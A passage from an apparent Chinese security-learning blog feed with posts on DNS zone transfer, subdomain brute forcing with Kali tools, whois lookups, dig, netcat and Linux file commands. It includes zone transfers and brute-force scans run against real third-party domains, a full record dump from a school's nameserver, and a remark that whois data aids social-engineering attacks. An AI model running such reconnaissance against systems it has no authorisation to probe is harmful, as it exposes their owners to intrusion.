%r %r %r’ ‘%r %r %r %r’```当然，在实际应用中%r更多的作用是用来调试和校验运行代码的哦！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[DNS区域传输，字典爆破，注册信息]]></title>
      <url>%2F2016%2F03%2F24%2FDNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E8%BE%93%EF%BC%8C%E5%AD%97%E5%85%B8%E7%88%86%E7%A0%B4%EF%BC%8C%E6%B3%A8%E5%86%8C%E4%BF%A1%E6%81%AF%2F</url>
      <content type="text"><![CDATA[0x00 DNS区域传输为了减轻单台DNS服务器的负载，有时要将同一DNS区域的内容保存在多个DNS服务器中，这时，就要用到DNS的“区域传输”功能，可以简单的理解为数据备份。正常情况之下，DNS区域传输只发生在本域的域名服务器之间，一旦dns服务器管理员dns区域传输配置不当，我们便可以使用以下两条常用的命令[并不仅限与这两种方法哈]获得其dns服务器中的所有记录！ 0x01 方法一依旧使用强大的dig命令实现。 我们知道一个域名上可能存在多个域名服务器，所以在区域传输需要指定域名中的某一个dns服务器。 区域传输命令:dig[axfr]1root@jack:~# dig @s1.example.com example.com axfr 下面以新浪为例进行实例演示： 首获得新浪NS记录: 123root@jack:~# dig +noall +answer sina.com nssina.com. 61070 IN NS ns1.sina.com.sina.com. 61070 IN NS ns3.sina.com. 选择第一条NS记录执行区域传输:12root@jack:~# dig +noall +answer @ns1.sina.com. sina.com axfr;; communications error to 114.134.80.144#53: end of file 可以看到连接结果为failed，尝试连接ip:114.134.80.144 53失败，当然只是由于新浪的管理员不是菜鸟哦！ ok，下面我们换一个域名试试，拿我亲爱的学校域名看看 123456789101112131415root@jack:~# dig @dns2.dqpi.edu.cn. dqpi.edu.cn axfr; &lt;&lt;&gt;&gt; DiG 9.9.5-9+deb8u6-Debian &lt;&lt;&gt;&gt; @dns2.dqpi.edu.cn. dqpi.edu.cn axfr; (1 server found);; global options: +cmddqpi.edu.cn. 86400 IN SOA dns2.dqpi.edu.cn. root.dns2.dqpi.edu.cn. 916622846 10800 3600 604800 86400dqpi.edu.cn. 86400 IN MX 10 mta1.dqpi.edu.cn.dqpi.edu.cn. 86400 IN MX 20 mta2.dqpi.edu.cn.dqpi.edu.cn. 86400 IN NS dns1.dqpi.edu.cn.dqpi.edu.cn. 86400 IN NS dns2.dqpi.edu.cn.15th-games.dqpi.edu.cn. 86400 IN A 61.167.120.18150.dqpi.edu.cn. 86400 IN A 61.167.120.181cacti.dqpi.edu.cn. 86400 IN A 61.167.120.82dqpi.edu.cn. 86400 IN SOA dns2.dqpi.edu.cn. ;; WHEN: Sat Mar 26 09:16:13 CST 2016;; XFR size: 45 records (messages 1, bytes 1032) 一条命令，轻松获得所有DNS记录！ 0x02 方法二: host简单点，直接上命令:12345678root@jack:~# host -T -l dqpi.edu.cn dns2.dqpi.edu.cn. 关键参数[-l]执行axfr的全区域差异传输，-T表示时间。返回结果：Using domain server:Name: dns2.dqpi.edu.cn.Address: 210.46.136.6#53wysf.dqpi.edu.cn has address 61.167.120.174zsb.dqpi.edu.cn has address 61.167.120.181 0x03 DNS字典爆破制作自己的DNS字典，使用常用的DNS域名字符串形成自己的字典，但如果觉得制作字典太过麻烦，便可以使用kali内置的一些爆破命令。这些工具的命令和功能都是大同小异的，初阶的我们熟练掌握一个就好了！ 以下是常用的DNS爆破工具: fierce{ Usage $: firece -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt n} 使用fierce时需要指定一个DNS服务器，可以时任意的缓存DNS服务器，本地联通\电信，google等等，-dns参数后面指定需要查询的域名，-worldlist参数后指定使用的字典！12345678910root@jack:~# fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txtDNS Servers for sina.com.cn: ns4.sina.com.cn ns1.sina.com.cn ns2.sina.com.cn ns3.sina.com.cnUnsuccessful in zone transfer (it was worth a shot)Okay, trying the good old fashioned way... brute forceCan&apos;t open a.txt or the default wordlistExiting... 可以看到，即使不存在a.txt的字典，firece依旧会执行一些操作，因为firece自动集成了axfr全区域差异传输，所以它会首先指定axfr功能，当失败以后才会 使用字典进行爆破！ 这里使用命令dpkg命令来查询fierce中所携带的所有安装在系统上的文件: 12345root@jack:~# dpkg -L fierce/./usr/usr/share/usr/share/fierce/hosts.txt 怀疑hosts.txt文件即是fierce所携带的字典: 12345root@jack:~# cat /usr/share/fierce/hosts.txt | grep wwwwwwwww-www-01www-02 ok,下面更换字典进行爆破：1root@jack:~# fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist /usr/share/fierce/hosts.txt dnsdict6{ Usage $: dnsdict6 -d4 -t 16 -x sina.com } dnsdict6携带多个不同级别的爆破字典，并且最大支持16个进程同时爆破。-t指定线程数，-x指定使用那种级别的字典！[-s][-m][-x][-u]分别代表小字典，中型字典，大字典，超大字典！ dnsenum{ Usage $: dnsenum -f dns.txt -dnsserver 8.8.8.8 sina.com -a sina.xml } dnsenum可以将查询的结果保存为特定格式的文件。 下面使用find命令查询dnsenum所携带的字典文件。 1234root@jack:~# find / -name dnsenum/usr/bin/dnsenum/usr/share/dnsenum/usr/share/doc/dnsenum 首先find会从/根目录开始查询，找到所有与dnsenum相关的目录！然后再逐个查看:12root@jack:~# ls /usr/share/dnsenumdns.txt ok,现在已经找到了dnsenum所携带的字典，尝试进行dns爆破！1234567891011121314151617root@jack:~# dnsenum -f /usr/share/dnsenum/dns.txt -dnsserver 8.8.8.8 sina.com -a sina.xml返回结果:----- sina.com -----Host&apos;s addresses:__________________sina.com. 58 IN A 66.102.251.33Name Servers:______________Mail (MX) Servers:___________________Trying Zone Transfers and getting Bind Versions:_________________________________________________Trying Zone Transfer for sina.com on ns3.sina.com ... _______________________________________________ads.sina.com. 59 IN CNAME region.sina.usgcac.cdnetworks.net. dnsmap{ Usage $: dnsmap sina.com -w dns.txt } dnsrecon{ Usage $: dnsrecon -d sina.com –lifetime 10 -t brt -D dnsbig.txt } [-d]:指定查询的域名 ! [-lifetime]:超时时间，超过时间找不到就认为不存在了！ [-t]:指定查询的强度! [-D]:指定字典进行爆破！ 123456root@jack:~# dnsrecon -d sina.com --lifetime 10 -t brt -D /usr/share/dnsrecon/namelist.txt[*] Performing host and subdomain brute force against sina.com[*] Do you wish to continue? y/n Y[*] A 02.sina.com 219.147.255.138[*] A 1.sina.com 219.147.255.138 0x04 爆破字典组合我们可以收集以上所有的工具中的字典构成一自己的大字典，然后使用自己认为很好用的一款工具进行爆破！ 0x05 DNS注册信息有时除了对dns进行爆破之外我们还需要通过whois来查询DNS注册人的信息，方便进行社工攻击！ 当然不同地区有不同地区的whois，下面是常用的whois查询地址:AFRINIC 非洲地区 http://www.afrinic.netAPNIC 太平洋地址 http://www.apnic.netARIN http://ws.arin.netLANA 国际组织 http://www.iana..comICANN http://www.icann.orgLACNIC http://www.lacnic.netNRO http://www.nro.netRIPE http://www.ripe.netInterNic http://www.internic.net 其中InterNic是全球最早的IP地址分配机构组织！ 下面在kali中使用命令行查询DNS人注册信息: whois123456789root@jack:~# whois wooyun.orgDomain Name: WOOYUN.ORGDomain ID: D159099935-LRORWHOIS Server:Referral URL: http://www.net.cnTech Email: xssshell@gmail.comName Server: NS1.DNSV2.COMName Server: NS2.DNSV2.COMDNSSEC: unsigned whois 查询IP:123456root@jack:~# whois 202.106.2.2% [whois.apnic.net]% Whois data copyright terms http://www.apnic.net/db/dbcopyright.html% Information related to &apos;202.106.0.0 - 202.106.255.255&apos;country: CNadmin-c: CH1302-AP]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[DNS信息收集-DIG]]></title>
      <url>%2F2016%2F03%2F21%2FDNS%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-DIG%2F</url>
      <content type="text"><![CDATA[DIG很多方面的特性和nclookup是相似的，但是DIG本身是比nslookup更强大的,使用也很方便，不用像nslookup总是set不停！Dig是Domain Information Groper的缩写，知道了来源想必大家也就容易记住这条命令了。 ox00 DIG简单使用最简单最常用的查询是查询一台主机，但是默认情况下，Dig的输出信息很详细，有时我们你不需要那么多的的输出，但它确实值得知道。 12345678910root@jack:/# dig www.baidu.com输出:; &lt;&lt;&gt;&gt; DiG 9.9.5-9+deb8u5-Debian &lt;&lt;&gt;&gt; www.baidu.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 36238;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1;; WHEN: Fri Mar 11 09:16:16 CST 2016;; MSG SIZE rcvd: 101 参数：any12345678root@jack:~# dig sina.com any返回结果:; &lt;&lt;&gt;&gt; DiG 9.9.5-9+deb8u5-Debian &lt;&lt;&gt;&gt; sina.com any;; global options: +cmdsina.com. 97 IN MX 10 freemx3.sinamail.sina.com.cn.sina.com. 97 IN MX 10 freemx2.sinamail.sina.com.cn.sina.com. 204 IN A 66.102.251.33 参数: noall + answer查询163邮箱的邮件服务器记录 123456root@jack:~# dig +noall +answer mail. 163.com 返回结果：mail. 0 IN A 219.147.255.138163.com. 383 IN A 123.58.180.8163.com. 383 IN A 123.58.180.7 查询主机记录并管道过滤查询163邮箱的邮件服务器记录，并使用管道命令进行过滤！123456 root@jack:~# dig +noall +answer mail 163.com any | awk &apos;&#123;print $5&#125;&apos;返回结果：219.147.255.138123.58.180.7123.58.180.8 反向域名解析(PTR记录)[dig参数-x的使用]：首先dig 163的mx记录1234567root@jack:~# dig +noall +answer 163.com mx返回结果 1.163.com. 14869 IN MX 10 163mx02.mxmail.netease.com.2.163.com. 14869 IN MX 10 163mx03.mxmail.netease.com.3.163.com. 14869 IN MX 50 163mx00.mxmail.netease.com.4.163.com. 14869 IN MX 10 163mx01.mxmail.netease.com. 查找CNAME对应IP选择第一个CNAME记录查询其对应的IP地址：12345root@jack:~# dig +noall +answer 163mx02.mxmail.netease.com.返回结果：163mx02.mxmail.netease.com. 563 IN A 220.181.14.155163mx02.mxmail.netease.com. 563 IN A 220.181.14.147 对IP进行反向解析对第一个ip进行反向解析：1234root@jack:~# dig +noall +answer -x 220.181.14.155返回结果：155.14.181.220.in-addr.arpa. 86385 IN PTR m14-155.188.com. 从最后的返回结果我们会发现，ptr解析记录和最初所查询的域名并不一致，这是很正常的，因为ip和域名之间通常的都是一对多的。 0x03 Dig特性 查询DNS bind的版本信息：{ Usage $: dig +noall +answer www.xx.com } 大部分的厂商使用的DNS服务器所使用的都是BIND，查询bind的目的，从我们之前的查询已经知道了，每个域名会对应许多个记录，对渗透目标最完美的DNS查询结果就是将其注册的所有DNS注册记录都查询出来，www/news/adc.sian.com，再将这些fqdn对应的所有IP地址全部都解析出来。但是当使用dig命令时，我们是不能直接查询不出它所有的fqdn记录的，却可以借用dig查询的到它的bind信息，如果bind是比较老的，且有漏洞的，便可以通过入侵bind获得dns的记录！ 下面是强大的dig bind命令: dig网站NS记录首先获得sina.com的NS记录：123456789root@jack:~# dig +answer sina.com返回结果：;; QUESTION SECTION:;sina.com. IN NS;; ANSWER SECTION:sina.com. 59596 IN NS ns1.sina.com.cn.sina.com. 59596 IN NS ns3.sina.com.sina.com. 59596 IN NS ns2.sina.com.cn. 查询dns的bind版本12345root@jack:~# dig +noall +answer txt chaos VERSION.BIND ns1.sina.com.cn.返回结果：VERSION.BIND. 0 CH TXT &quot;Why query me?Your IP had been logged!&quot; 我们可以看到返回的结果为空，这是因为sina DNS服务器设置了保护模式，我们不能通过此方式查询！bind信息对于黑客是很感兴趣的，所有现在绝大多数的互联网公司都会隐藏的的bind信息！ 0x04 DNS追踪{ Usage $: [dig +trace example.com] } 直接运行命令：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172root@jack:~# dig +trace www.sina.com返回结果：; &lt;&lt;&gt;&gt; DiG 9.9.5-9+deb8u2-Debian &lt;&lt;&gt;&gt; +trace www.sina.com;; global options: +cmd. 19560 IN NS m.root-servers.net.. 19560 IN NS f.root-servers.net.. 19560 IN NS g.root-servers.net.. 19560 IN NS d.root-servers.net.. 19560 IN NS a.root-servers.net.. 19560 IN NS e.root-servers.net.. 19560 IN NS j.root-servers.net.. 19560 IN NS k.root-servers.net.. 19560 IN NS l.root-servers.net.. 19560 IN NS b.root-servers.net.. 19560 IN NS h.root-servers.net.. 19560 IN NS c.root-servers.net.. 19560 IN NS i.root-servers.net.;; Received 239 bytes from 112.100.100.100#53(112.100.100.100) in 82 ms&lt;a&gt;首先trace通过本机访问13个根（.）服务器,随机挑选一个查询.com域的NS记录&lt;/a&gt;com. 172800 IN NS a.gtld-servers.net.com. 172800 IN NS b.gtld-servers.net.com. 172800 IN NS c.gtld-servers.net.com. 172800 IN NS d.gtld-servers.net.com. 172800 IN NS e.gtld-servers.net.com. 172800 IN NS f.gtld-servers.net.com. 172800 IN NS g.gtld-servers.net.com. 172800 IN NS h.gtld-servers.net.com. 172800 IN NS i.gtld-servers.net.com. 172800 IN NS j.gtld-servers.net.com. 172800 IN NS k.gtld-servers.net.com. 172800 IN NS l.gtld-servers.net.com. 172800 IN NS m.gtld-servers.net.com. 86400 IN DS 30909 8 2 E2D3C916F6DEEAC73294E8268FB5885044A833FC5459588F4A9184CF C41A5766com. 86400 IN RRSIG DS 8 1 86400 20160403050000 20160324040000 54549 . ZySdwNEXufOygOza5asIf7Aa4JZSVuaNDAW+fJhd9w5F1w29hO8ffNYs mUf4FsC5dHgZOYSikbyZJeyKryqTnvCqU+2OQcbYxvF8l9ahETNxJE8m FTnEVtaQJK+e72h+9BDAyO022v6wAo8P9+OC0u9P2yooIbUr7Ys/ODHc SfE=;; Received 736 bytes from 192.58.128.30#53(j.root-servers.net) in 210 ms&lt;a&gt;再从获得的从com域名中随机挑选一个查询sina.com的NS记录&lt;/a&gt;sina.com. 172800 IN NS ns1.sina.com.cn.sina.com. 172800 IN NS ns2.sina.com.cn.sina.com. 172800 IN NS ns3.sina.com.cn.sina.com. 172800 IN NS ns1.sina.com.sina.com. 172800 IN NS ns2.sina.com.sina.com. 172800 IN NS ns4.sina.com.sina.com. 172800 IN NS ns3.sina.com.CK0POJMG874LJREF7EFN8430QVIT8BSM.com. 86400 IN NSEC3 1 1 0 - CK0Q1GIN43N1ARRC9OSM6QPQR81H5M9A NS SOA RRSIG DNSKEY NSEC3PARAMCK0POJMG874LJREF7EFN8430QVIT8BSM.com. 86400 IN RRSIG NSEC3 8 2 86400 20160331045906 20160324034906 28259 com. bHlKyZIPRgtRjaONiuYtTtkWRNb08sDePoBAoTw49t9YRU6KYSJgn7se +OfmBIA1rvCx3YIE82z0Q9A64s4z7XwRAhWqjW++lDACLsIzJ/tUP3TO DBucmG/NOBmAXUpRwo91zFjukbPOZ1PeYVpBjTmaRaI23MGJ0ANHbFUW oDs=TGAFTKK08BOUSKO3P3B8A4U84C84DTHM.com. 86400 IN NSEC3 1 1 0 - TGAIGAA7UE2B06LAN5KC5MT51RE8U42A NS DS RRSIGTGAFTKK08BOUSKO3P3B8A4U84C84DTHM.com. 86400 IN RRSIG NSEC3 8 2 86400 20160330043912 20160323032912 28259 com. UfPPJ9326mLBJIz60EgkDgT6fif4fOcgieasgz4a752Gc9e6LKTtMPvF KpLu2R4lfKMj/edVf637U4eQKo8C+Mvatv1qVxvqufiQRM15uOqdvejb muvJncBomFxfgjAOTmIHD0dIE5ho/R/8RW4xjCxAYrYkdumoDgvg1tc9 s44=;; Received 727 bytes from 192.26.92.30#53(c.gtld-servers.net) in 429 ms&lt;a&gt;再从获得的sina.com域名中随机挑选一个查询www.sina.com的NS记录，此后将会一次逐级解析下去，知道全部记录解析完毕！&lt;/a&gt;www.sina.com. 60 IN CNAME us.sina.com.cn.us.sina.com.cn. 60 IN CNAME news.sina.com.cn.news.sina.com.cn. 60 IN CNAME jupiter.sina.com.cn.jupiter.sina.com.cn. 3600 IN CNAME hydra.sina.com.cn.hydra.sina.com.cn. 60 IN A 218.30.108.183hydra.sina.com.cn. 60 IN A 218.30.108.184hydra.sina.com.cn. 60 IN A 218.30.108.185hydra.sina.com.cn. 60 IN A 218.30.108.186hydra.sina.com.cn. 60 IN A 218.30.108.187hydra.sina.com.cn. 60 IN A 218.30.108.188hydra.sina.com.cn. 60 IN A 218.30.108.189hydra.sina.com.cn. 60 IN A 218.30.108.190hydra.sina.com.cn. 60 IN A 218.30.108.191hydra.sina.com.cn. 60 IN A 218.30.108.192hydra.sina.com.cn. 60 IN A 218.30.108.180hydra.sina.com.cn. 60 IN A 218.30.108.181hydra.sina.com.cn. 60 IN A 218.30.108.182sina.com.cn. 86400 IN NS ns3.sina.com.cn.sina.com.cn. 86400 IN NS ns1.sina.com.cn.sina.com.cn. 86400 IN NS ns2.sina.com.cn.sina.com.cn. 86400 IN NS ns4.sina.com.cn.;; Received 474 bytes from 123.125.29.99#53(ns3.sina.com.cn) in 36 ms 从上的追踪过程其实就是所谓的迭代查询过程！下面我们来看看递归查询的结果: 1root@jack:~# dig sina.com 从wireshark所获得的抓包数据我们可以看到关于dns的记录就两条！关于递归查询与迭代查询请参考相关资料。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[NETCAT]]></title>
      <url>%2F2016%2F02%2F28%2F%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7-NETCAT%2F</url>
      <content type="text"><![CDATA[NetCat网络工具的”瑞士军刀”，小身材，大智慧。 0x00 NC简介 NetCat是一个非常简单的Unix工具，可以读、写TCP或UDP网络连接(network connection)。它被设计成一个可靠的后端(back-end) 工具，通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能。NetCat，它的实际可运行的名字叫nc，是一个很早就被提供，但没有公开的事实标准的Unix工具。使用NC命令所能完成的事情令人惊讶。 NetCat还可以当服务器使用，监听任意指定端口的连接请求(inbound connection)，并可做同样的读写操作。除了较小限制外，它实际并不关心自己以“客户端”模式还是“服务器”模式运行，它都会来回运送全部数据。在任何一种模式下，都可以设置一个非活动时间来强行关闭连接。 它还可以通过UDP来完成这些功能，因此它就象一个telnet那样的UDP程序，用来测试你的UDP服务器。正如它的“U”所指的，UDP跟TCP相比是一种不可靠的数据传输，一些系统在使用UDP 传送大量数据时会遇到麻烦，但它还有一些用途。 你可能会问“为什么不用telnet来连接任意的端口”？问题提得好(valid)，这儿有一些理由。Telnet有“标准输入文件结束符(standard input EOF)”问题，所以需要在脚本中延迟计算以便等待网络输出结束。这就是netcat持续运行直到连接被关闭的主要原因。Telnet也不能传输任意的二进制数据，因为一些特定的字符会被解释为Telnet的参数而被从数据流中去除。Telnet还将它的一些诊断信息显示到标准输出上，而NC会将这信息与它的输出分开以不改变真实数据的传输，除非你要求它这么做。当然了，Telnet也不能监听端口，也不能使用UDP。 NC没有这些限制，比Telnet更小巧和快捷，而且还有一些其它的功能。 NC所做的就是在两台电脑之间建立链接并返回两个数据流，在这之后所能做的事就看你的想像力了。你能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。 0x01 telent/获取banner信息nc-nv 1.1.1.1 110邮件服务器pop3端口nc-nv 1.1.1.1 25 邮件服务器smtp端口nc-nv 1.1.1.1 80 网站80端口 实例：metasploitable2的ip地址为:192.168.14.22 客户端模式下常用命令: 12345678 $:nc -vn 192.168.14.22 ``` --- ### 0x02 传输文本信息kali和ubuntu为例,首先需要其中一台服务器打开一个端口，然后进行tcp连接，第一台服务器去侦听某个端口时使用nc -l 通过-p指定端口号，客户端:nc -nv 1.1.1.1 4444* 实例:简单的聊天: ubuntu $:sudo nc -l -p 3333 {开通3333端口}$:netstat -pantu | grep 3333 {查看3333端口是否已经开通}12```kali $:nc -nv 192.168.14.23 333 0x03 传输文件/目录 远程电子取证信息收集:在本地计算机监听特定端口: 1$ nc -l -p 3333 &gt; ps.txt &#123;使用管道命令将3333收到的文件重定向到ps.txt文件&#125; 从被取证计算机传输收集信息给远端本地电脑:123456$ ps aux | nc -nv 192.168.14.20 3333 -q 1 &#123;-q 1 标准输出完成以后1sec后自动断开连接&#125;``` ---#### 传输文件 * A作为接受端打开端口 $ nc -lp 3333 &gt; 1.mp4 {将侦听到的3333端口的信息输出到1.mp4文件中}1B端为发送端: $ nc -nv 1.1.1.1 3333 &lt; 1.mp4 -q 1 {将1.mp4文件的内容宿儒到目标ip的3333端口，传递完成一秒后断开连接}1* 或者A作为发送端打开端口: $ nc -q 1 -lp 3333]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[第六章-文件权限与目录配置]]></title>
      <url>%2F2016%2F02%2F27%2F%E7%AC%AC%E4%B8%83%E7%AB%A0-%E6%96%87%E4%BB%B6%E4%B8%8E%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86%2F</url>
      <content type="text"><![CDATA[0x00 目录与路径 绝对路径与相对路径绝对路径写法『一定由根目录 / 写起』，例如： /usr/share/doc 这个目录。 相对路径路径的写法『不是由 / 写起』，例如由 /usr/share/doc 要到 /usr/share/man 底下时，可以写成： 『cd ../man』这就是相对路径的写法啦！相对路径意指『相对於目前工作目录的路径！』 目录的相关操作:cd,pwd,mkdir,rmdir .：代表此层目录 ..:：代表上一层目录 -：代表前一个工作目录 ~：代表『目前使用者身份』所在的家目录 ~account：代表 account 这个使用者的家目录(account是个帐号名称在所有目录底下都会存在的两个目录，分别是『.』与『..』 分别代表此层与上一级目录的意思 cd变换目录12345$: cd ~ &#123;回到当前登录者的家目录&#125;$: cd .. &#123;返回上一级目录&#125;$: cd - &#123;返回前一个目录，不是上级目录是相对于当工作目录而言的前一目录&#125;$: cd ../public &#123;相对路径写法&#125;#由/var/spool/schemes 去到/var/spool/public 就这样写！# pwd：显示目前的目录pwd是Print Working Directory，就是显示目前所在目录的命令 mkdir:创建一个新的目录如果想要创建新的目录的话，那么就使用mkdir (make directory)吧！ 不过，在默认的情况下， 你所需要的目录得一层一层的创建才行！但是，加上 -p 这个选项后便可以直接下达：『 mkdir -p /home/bird/testing/test1 』 则系统会自动的帮你将 /home, /home/bird, /home/bird/testing 依序的创建起目录！并且， 如果该目录本来就已经存在时，系统也不会显示错误信息！ rmdir:删除一个空的目录删除旧有的目录时，就使用rmdir吧，请注意，目录需要一层一层的删除才行！而且被删除的目录里面必定不能存在其他的目录或文件！同样的如果使用『 rm -r test 』即可一次性删除所有目录！ 环境变量:$PATH为什么我可以在任何地方运行ls这个命令呢？ 』 为什么我在任何目录下输入 ls 就一定可以显示出一些信息而不会说找不到该 ls 命令呢？ 这是因为环境变量 PATH 的帮助！ 0x01 文件与目录管理 文件与目录的检视ls12345678910root@ $:ls-选项与参数:-a ：全部的文件，连同隐藏档( 开头为 . 的文件) 一起列出来(常用)-d ：仅列出目录本身，而不是列出目录内的文件数据(常用)-l ：长数据串列出，包含文件的属性与权限等等数据；(常用)-i ：列出 inode 号码，inode 的意义下一章将会介绍；-S ：以文件容量大小排序，而不是用档名排序；-t ：依时间排序，而不是用档名。--full-time ：以完整时间模式 (包含年、月、日、时、分) 输出--time=&#123;atime,ctime&#125; ：输出 access 时间或改变权限属性时间 (ctime) 而非内容变更时间 (modification time) 复制、删除与移动： cp, rm, mv cp复制12345678[root@www ~]# cp [-adfilprsu] 来源档(source) 目标档(destination)[root@www ~]# cp [options] source1 source2 source3 .... directory选项与参数：-a ：相当於 -pdr 的意思，至於 pdr 请参考下列说明；(常用)-d ：若来源档为连结档的属性(link file)，则复制连结档属性而非文件本身；-i ：若目标档(destination)已经存在时，在覆盖时会先询问动作的进行(常用)-p ：连同文件的属性一起复制过去，而非使用默认属性(备份常用)；-r ：递回持续复制，用於目录的复制行为；(常用) rm (移除文件或目录)12345root@ $:rm -[fir]文件或目录选项与参数：-f ：就是 force 的意思，忽略不存在的文件，不会出现警告信息；-i ：互动模式，在删除前会询问使用者是否动作-r ：递回删除啊！最常用在目录的删除了！这是非常危险的选项！！！ 不过，使用『 rm -r 』这个命令之前，请千万注意了，因为该目录或文件『肯定』会被 root 杀掉！ mv (移动文件与目录，或更名)123456root@ $:mv [-fiu] source destinationroot@ $: mv [options] source1 source2 source3 .... directory选项与参数：-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖；-i ：若目标文件 (destination) 已经存在时，就会询问是否覆盖！-u ：若目标文件已经存在，且 source 比较新，才会升级 (update) 注意到这边，如果有多个来源文件或目录，则最后一个目标档一定是『目录！ 0x02 文件内容查询 cat 由第一行开始显示文件内容 tac 从最后一行开始显示，可以看出 tac 是 cat 的倒著写！ nl 显示的时候，顺道输出行号！ more 一页一页的显示文件内容 less 与 more 类似，但是比 more 更好的是，他可以往前翻页！ head 只看头几行 tail 只看尾巴几行 od 以二进位的方式读取文件内容！ cat1234root@ $: cat -选项与参数：-b ：列出行号，仅针对非空白行做行号显示，空白行不标行号！-n ：列印出行号，连同空白行也会有行号，与 -b 的选项不同； tac (反向列示)cat 与 tac ，tac 刚好是将 cat 反写过来，所以他的功能就跟 cat 相反， cat 是由『第一行到最后一行连续显示在萤幕上』，而 tac 则是『 由最后一行到第一行反向在萤幕上显示出来 』! nl (添加行号列印)12345678910root@ $: nl []filename-b ：指定行号指定的方式，主要有两种： -b a ：表示不论是否为空行，也同样列出行号(类似 cat -n)； -b t ：如果有空行，空的那一行不要列出行号(默认值)；-n ：列出行号表示的方法，主要有三种： -n ln ：行号在萤幕的最左方显示； -n rn ：行号在自己栏位的最右方显示，且不加 0 ； -n rz ：行号在自己栏位的最右方显示，且加 0 ；-w ：行号栏位的占用的位数。cat -n 有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐 0 等等的功能 more (一页一页翻动)12345678root@ $: more []filname选项与参数:空白键 (space) ：代表向下翻一页；Enter ：代表向下翻『一行』；/字串 ：代表在这个显示的内容当中，向下搜寻『字串』这个关键字；:f ：立刻显示出档名以及目前显示的行数；q ：代表立刻离开 more ，不再显示该文件内容。b 或 [ctrl]-b ：代表往回翻页，不过这动作只对文件有用，对管线无用。 less (一页一页翻动)less 的用法比起 more 又更加的有弹性,在 more 的时候，我们并没有办法向前面翻， 只能往后面看，但若使用了 less 时,就可以使用 [pageup] [pagedown] 等按键的功能来往前往后翻看文件!12345678910root@ $:less [] filename选项与参数：空白键 ：向下翻动一页；[pagedown]：向下翻动一页；[pageup] ：向上翻动一页；/字串 ：向下搜寻『字串』的功能；?字串 ：向上搜寻『字串』的功能；n ：重复前一个搜寻 (与 / 或 ? 有关！)N ：反向的重复前一个搜寻 (与 / 或 ? 有关！)q ：离开 less 这个程序； 数据截取们可以将输出的数据作一个最简单的撷取，那就是取出前面 (head) 与取出后面 (tail) 文字的功能。 不过，要注意的是， head 与 tail 都是以『行』为单位来进行数据撷取的 head123root@ $:head [-n number] 文件 选项与参数：-n ：后面接数字，代表显示几行的意思.默认的情况中，显示前面十行！ 另外的-n 选项后面的参数如果接的是负数，例如范例的-n -100时，代表列前的所有行数， 但不包括后面100行 tail1234root@ $: tail [-n number] 文件 选项与参数：-n ：后面接数字，代表显示几行的意思-f ：表示持续侦测后面所接的档名，要等到按下[ctrl]-c才会结束tail的侦测 同样的但-n后面跟的是一个负数是如：当下达『tail -n +100 /etc/man.config』 代表该文件从100行以后都会被列出来! 假如要显示 /etc/man.config 的第 11 到第 20 行？1root@ $： head -n 20 /etc/man.config | tail -n 10 修改文件时间或建置新档： touch每个文件在linux底下都会记录许多的时间参数， 其实是有三个主要的变动时间，那么三个时间的意义： modification time (mtime)：当该文件的『内容数据』变更时，就会升级这个时间！内容数据指的是文件的内容，而不是文件的属性或权限喔！ status time (ctime)：当该文件的『状态 (status)』改变时，就会升级这个时间，举例来说，像是权限与属性被更改了，都会升级这个时间啊。 access time (atime)：当『该文件的内容被取用』时，就会升级这个读取时间 (access)。举例来说，我们使用 cat 去读取 /etc/man.config ， 就会升级该文件的 atime 了 touch 这个命令最常被使用的情况是：创建一个空的文件；将某个文件日期修订为目前 (mtime 与 atime) 1234567root@ $: touch [-acdmt] 文件选项与参数：-a ：仅修订 access time；-c ：仅修改文件的时间，若该文件不存在则不创建新文件；-d ：后面可以接欲修订的日期而不用目前的日期，也可以使用 --date=&quot;日期或时间&quot;-m ：仅修改 mtime ；-t ：后面可以接欲修订的时间而不用目前的时间，格式为[YYMMDDhhmm] 0x03 文件与目录的默认权限与隐藏权限由第六章、Linux文件权限的内容我们可以知道一个文件有若干个属性， 包括读写运行(r, w, x)等基本权限，及是否为目录 (d) 与文件 (-) 或者是连结档 (l) 等等的属性！ 要修改属性的方法在前面也约略提过了(chgrp, chown, chmod) ，本小节会再加强补充一下，要来谈一谈，『新增一个文件或目录时，默认的权限是什么？』 文件默认权限：umaskumask 就是指定 『目前使用者在创建文件或目录时候的权限默认值』查需umask配置:12345root@jack:~# umask0022root@jack:~# umask -Su=rwx,g=rx,o=rxroot@jack:~# 查阅的方式有两种，一种可以直接输入 umask ，就可以看到数字型态的权限配置分数， 一种则是加入 -S (Symbolic) 这个选项，就会以符号类型的方式来显示出权限了！第一组是特殊权限用的，我们先不要理他，所以先看后面三组即可。 此前在默认权限的属性上，目录与文件是不一样的： 若使用者创建为『文件』则默认『没有可运行( x )权限』，亦即只有 rw 这两个项目，也就是最大为 666 分，默认权限如下：-rw-rw-rw- 若使用者创建为『目录』，则由於 x 与是否可以进入此目录有关，因此默认为所有权限均开放，亦即为 777 分，默认权限如drwxrwxrwx umask 的分数指的是该默认值需要减掉的权限因为 r、w、x 分别是 4、2、1 分，也就是说，当要拿掉能写的权限，就是输入 2 分，而如果要拿掉能读的权限，也就是 4 分，那么要拿掉读与写的权限，也就是 6 分，而要拿掉运行与写入的权限，也就是 3 分， 5 分是什么, 就是读与运行的权限啦！” 如果以上面的例子来说明，因为 umask 为 022 ，所以 user 